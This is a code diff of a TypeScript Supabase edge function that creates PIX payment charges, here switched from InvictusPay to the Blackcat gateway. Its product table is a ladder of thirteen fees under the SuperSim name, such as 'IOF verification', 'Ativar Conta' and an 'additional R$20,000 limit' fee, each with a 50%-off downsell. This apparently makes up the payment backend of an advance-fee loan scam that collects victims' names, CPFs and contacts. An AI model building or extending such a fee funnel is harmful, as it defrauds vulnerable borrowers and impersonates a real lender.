@@ -1,38 +1,37 @@
 import "jsr:@supabase/functions-js/edge-runtime.d.ts";
 
-// ── Produtos/ofertas cadastrados na InvictusPay (product_hash + offer_hash) ──
-const PIX_PRODUCTS: Record<string, { priceCents: number; name: string; productHash: string; offerHash: string }> = {
-  seguro:    { priceCents: 1948, name: "Seguro Prestamista - SuperSim",              productHash: "giwkhiwref", offerHash: "63fhm" },
-  up1:       { priceCents: 2482, name: "IOF - Imposto sobre Operações Financeiras",   productHash: "r9afv8sztr", offerHash: "pfnwd" },
-  up2:       { priceCents: 2391, name: "Taxa de Verificação de IOF",                  productHash: "yapvcq8gwc", offerHash: "hic4z" },
-  up3:       { priceCents: 1868, name: "Seguro Prestamista - Tarifa de Cadastro",     productHash: "hmigi2vct6", offerHash: "gdoeq" },
-  up4:       { priceCents: 1720, name: "TENF - Taxa de Emissão da Nota Fiscal",       productHash: "fyvpnxouab", offerHash: "yf81c" },
-  up5:       { priceCents: 1700, name: "Ativar Conta",                               productHash: "rppl6fbvln", offerHash: "qn5hi" },
-  up6:       { priceCents: 1702, name: "Taxa de Registro do Contrato",               productHash: "j0nj2urjk2", offerHash: "x3quy" },
-  up7:       { priceCents: 1406, name: "Taxa - Limite Adicional de R$20.000",        productHash: "aq1y1sbu6x", offerHash: "giw0z" },
-  up8:       { priceCents: 1406, name: "Taxa de Processamento",                      productHash: "xgpnk4hlj7", offerHash: "xvcpf" },
-  up9:       { priceCents: 1199, name: "Aplicativo SuperSim",                        productHash: "kwaxxp1ijz", offerHash: "7ccmc" },
-  up10:      { priceCents: 1692, name: "TAC - Taxa de Abertura de Crédito",          productHash: "65uqv8d137", offerHash: "3d9jy" },
-  up11:      { priceCents: 1953, name: "Taxa de Consultoria Financeira",             productHash: "qzcbj0ovvy", offerHash: "gx3zv" },
-  up12:      { priceCents: 3192, name: "Taxa de Processamento Administrativo",       productHash: "g7llhbwveo", offerHash: "38isd" },
+// ── Preços server-side (em centavos p/ Blackcat) ──
+const PIX_PRODUCTS: Record<string, { priceCents: number; name: string }> = {
+  seguro:  { priceCents: 1948, name: "Seguro Prestamista - SuperSim" },
+  up1:     { priceCents: 2482, name: "IOF - Imposto sobre Operações Financeiras" },
+  up2:     { priceCents: 2391, name: "Taxa de Verificação de IOF" },
+  up3:     { priceCents: 1868, name: "Seguro Prestamista - Tarifa de Cadastro" },
+  up4:     { priceCents: 1720, name: "TENF - Taxa de Emissão da Nota Fiscal" },
+  up5:     { priceCents: 1700, name: "Ativar Conta" },
+  up6:     { priceCents: 1702, name: "Taxa de Registro do Contrato" },
+  up7:     { priceCents: 1406, name: "Taxa - Limite Adicional de R$20.000" },
+  up8:     { priceCents: 1406, name: "Taxa de Processamento" },
+  up9:     { priceCents: 1199, name: "Aplicativo SuperSim" },
+  up10:    { priceCents: 1692, name: "TAC - Taxa de Abertura de Crédito" },
+  up11:    { priceCents: 1953, name: "Taxa de Consultoria Financeira" },
+  up12:    { priceCents: 3192, name: "Taxa de Processamento Administrativo" },
   // ── DOWNSELL (50% OFF) ──
-  seguro_ds: { priceCents: 645,  name: "Seguro Prestamista - SuperSim",              productHash: "ydcktrxv0v", offerHash: "v2rpu" },
-  up1_ds:    { priceCents: 1241, name: "IOF - Imposto sobre Operações Financeiras",   productHash: "cijrbnszjf", offerHash: "eknp2" },
-  up2_ds:    { priceCents: 1196, name: "Taxa de Verificação de IOF",                  productHash: "chhbqnt5lb", offerHash: "kqhgo" },
-  up3_ds:    { priceCents: 934,  name: "Seguro Prestamista - Tarifa de Cadastro",     productHash: "aezadrexwr", offerHash: "s7lp9" },
-  up4_ds:    { priceCents: 860,  name: "TENF - Taxa de Emissão da Nota Fiscal",       productHash: "ttpokudoxz", offerHash: "0tkr2" },
-  up5_ds:    { priceCents: 850,  name: "Ativar Conta",                               productHash: "rdmjwtcnoh", offerHash: "kx1vd" },
-  up6_ds:    { priceCents: 850,  name: "Taxa de Registro do Contrato",               productHash: "bm9qwtskq8", offerHash: "rb64g" },
-  up7_ds:    { priceCents: 703,  name: "Taxa - Limite Adicional de R$20.000",        productHash: "wxi37bkeof", offerHash: "thsla" },
-  up8_ds:    { priceCents: 703,  name: "Taxa de Processamento",                      productHash: "faw1qlhsav", offerHash: "1pqjs" },
-  up9_ds:    { priceCents: 600,  name: "Aplicativo SuperSim",                        productHash: "wla8o7oxkk", offerHash: "pf2pm" },
-  up10_ds:   { priceCents: 846,  name: "TAC - Taxa de Abertura de Crédito",          productHash: "yhiekzqqy3", offerHash: "0u7j7" },
-  up11_ds:   { priceCents: 977,  name: "Taxa de Consultoria Financeira",             productHash: "uv82qr9kc9", offerHash: "ctetc" },
-  up12_ds:   { priceCents: 1596, name: "Taxa de Processamento Administrativo",       productHash: "vsouxvjrpn", offerHash: "ocrtj" },
+  seguro_ds: { priceCents: 645,  name: "Seguro Prestamista - SuperSim" },
+  up1_ds:    { priceCents: 1241, name: "IOF - Imposto sobre Operações Financeiras" },
+  up2_ds:    { priceCents: 1196, name: "Taxa de Verificação de IOF" },
+  up3_ds:    { priceCents: 934,  name: "Seguro Prestamista - Tarifa de Cadastro" },
+  up4_ds:    { priceCents: 860,  name: "TENF - Taxa de Emissão da Nota Fiscal" },
+  up5_ds:    { priceCents: 850,  name: "Ativar Conta" },
+  up6_ds:    { priceCents: 850,  name: "Taxa de Registro do Contrato" },
+  up7_ds:    { priceCents: 703,  name: "Taxa - Limite Adicional de R$20.000" },
+  up8_ds:    { priceCents: 703,  name: "Taxa de Processamento" },
+  up9_ds:    { priceCents: 600,  name: "Aplicativo SuperSim" },
+  up10_ds:   { priceCents: 846,  name: "TAC - Taxa de Abertura de Crédito" },
+  up11_ds:   { priceCents: 977,  name: "Taxa de Consultoria Financeira" },
+  up12_ds:   { priceCents: 1596, name: "Taxa de Processamento Administrativo" },
 };
 
-const INVICTUS_URL = "https://api.invictuspay.app.br/api/public/v1";
-const WEBHOOK_URL = "https://ziznxwaehnifcinosenv.supabase.co/functions/v1/webhook";
+const BLACKCAT_URL = "https://api.blackcatoficial.com/api";
 
 const corsHeaders = {
   "Access-Control-Allow-Origin": "*",
@@ -78,10 +77,10 @@ Deno.serve(async (req: Request) => {
       });
     }
 
-    // ── Token da InvictusPay (variável de ambiente) ──
-    const INVICTUS_API_TOKEN = Deno.env.get("INVICTUS_API_TOKEN");
-    if (!INVICTUS_API_TOKEN) {
-      console.error("INVICTUS_API_TOKEN not configured");
+    // ── Chave secreta da Blackcat (variável de ambiente) ──
+    const BLACKCAT_SECRET = Deno.env.get("BLACKCAT_SECRET_KEY");
+    if (!BLACKCAT_SECRET) {
+      console.error("BLACKCAT_SECRET_KEY not configured");
       return new Response(JSON.stringify({ success: false, error: "Server config error" }), {
         status: 500,
         headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -90,33 +89,39 @@ Deno.serve(async (req: Request) => {
 
     // ── Limpa CPF (só dígitos) ──
     const cpfClean = (cpf || "").replace(/\D/g, "");
-    // ── Telefone: apenas dígitos, sem DDI (formato esperado pela InvictusPay: DDD+número) ──
-    const phoneClean = (phone || "").replace(/\D/g, "");
 
-    const invictusPayload = {
+    // ── Cria cobrança na Blackcat ──
+    // ── Telefone: apenas dígitos, com DDI 55 ──
+    let phoneClean = (phone || "").replace(/\D/g, "");
+    if (phoneClean && phoneClean.length <= 11 && !phoneClean.startsWith("55")) {
+      phoneClean = "55" + phoneClean;
+    }
+
+    const blackcatPayload = {
       amount: product.priceCents,
-      offer_hash: product.offerHash,
-      payment_method: "pix",
+      paymentMethod: "pix",
       customer: {
         name: nome || "Cliente",
         email: email || `${cpfClean || "cliente"}@email.com`,
-        phone_number: phoneClean || "11999999999",
-        document: cpfClean,
+        phone: phoneClean || "5500000000000",
+        document: {
+          number: cpfClean,
+          type: cpfClean.length > 11 ? "cnpj" : "cpf",
+        },
       },
-      cart: [
+      items: [
         {
-          product_hash: product.productHash,
           title: product.name,
-          price: product.priceCents,
           quantity: 1,
-          operation_type: 1,
+          unitPrice: product.priceCents,
           tangible: false,
         },
       ],
-      expire_in_days: 1,
-      transaction_origin: "api",
-      // UTMs de rastreamento no formato esperado pela InvictusPay
-      tracking: {
+      pix: {
+        expiresInDays: 1,
+      },
+      // UTMs de rastreamento no formato esperado pela Blackcat
+      utm: {
         src: trackingParams.src || "",
         sck: trackingParams.sck || "",
         utm_source: trackingParams.utm_source || "",
@@ -125,28 +130,34 @@ Deno.serve(async (req: Request) => {
         utm_content: trackingParams.utm_content || "",
         utm_term: trackingParams.utm_term || "",
       },
-      // Postback por transação — a InvictusPay chama essa URL quando o status mudar
-      postback_url: WEBHOOK_URL,
+      // Metadata para recuperar no webhook de pagamento (caso a Blackcat suporte)
+      metadata: {
+        upKey,
+        ...trackingParams,
+        customerEmail: email || "",
+        customerPhone: phoneClean || "",
+        customerName: nome || "",
+      },
     };
 
     console.log(`[PIX] Creating sale for upKey=${upKey}, amount=${product.priceCents}, utms=${JSON.stringify(trackingParams)}`);
 
-    const invRes = await fetch(`${INVICTUS_URL}/transactions?api_token=${INVICTUS_API_TOKEN}`, {
+    const bcResponse = await fetch(`${BLACKCAT_URL}/sales/create-sale`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
-        "Accept": "application/json",
+        "X-API-Key": BLACKCAT_SECRET,
       },
-      body: JSON.stringify(invictusPayload),
+      body: JSON.stringify(blackcatPayload),
     });
 
-    const invData = await invRes.json();
-    console.log(`[PIX] InvictusPay response status=${invRes.status}`, JSON.stringify(invData));
+    const bcData = await bcResponse.json();
+    console.log(`[PIX] Blackcat response status=${bcResponse.status}`, JSON.stringify(bcData));
 
-    if (!invRes.ok) {
+    if (!bcResponse.ok) {
       return new Response(JSON.stringify({
         success: false,
-        error: invData.message || "Erro ao criar cobrança",
+        error: bcData.message || "Erro ao criar cobrança",
       }), {
         status: 502,
         headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -154,12 +165,13 @@ Deno.serve(async (req: Request) => {
     }
 
     // ── Extrai dados do PIX ──
-    const txnId = invData.hash;
-    const qrcode = invData.pix?.pix_qr_code || "";
+    // Blackcat retorna: { success: true, data: { transactionId, paymentData: { qrCode, copyPaste, qrCodeBase64 } } }
+    const txnId = bcData.data?.transactionId || bcData.transactionId || bcData.id;
+    const qrcode = bcData.data?.paymentData?.copyPaste || bcData.data?.paymentData?.qrCode || bcData.data?.pix?.qrCode || "";
     const amountReais = product.priceCents / 100;
 
     if (!txnId || !qrcode) {
-      console.error("[PIX] Missing txnId or qrcode in InvictusPay response:", JSON.stringify(invData));
+      console.error("[PIX] Missing txnId or qrcode in Blackcat response:", JSON.stringify(bcData));
       return new Response(JSON.stringify({
         success: false,
         error: "Resposta incompleta do gateway",
@@ -171,7 +183,7 @@ Deno.serve(async (req: Request) => {
     }
 
     // ── Persiste a transação c/ as UTMs capturadas agora — fonte confiável pro webhook depois,
-    // já que o postback da InvictusPay não devolve UTM/metadata nenhum ──
+    // já que não dá pra garantir que a Blackcat vai ecoar o "utm" de volta no evento de pagamento ──
     const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
     const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
     if (SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY) {
